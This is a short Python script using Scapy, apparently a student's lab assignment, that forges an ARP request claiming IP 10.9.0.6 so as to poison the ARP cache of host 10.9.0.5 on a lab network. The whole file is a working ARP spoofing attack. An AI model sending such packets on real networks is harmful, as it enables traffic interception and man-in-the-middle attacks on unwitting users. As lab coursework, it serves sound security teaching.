#!/usr/bin/python3
from scapy.all import *
print("CMPE209-Assignment1-016707314-ARP Cache Poisoning Attack - Task1A- Using ARP Request");

E = Ether(dst='02:42:0a:09:00:05')
A = ARP(psrc='10.9.0.6', pdst='10.9.0.5')

pkt = E/A
pkt.show()
sendp(pkt)
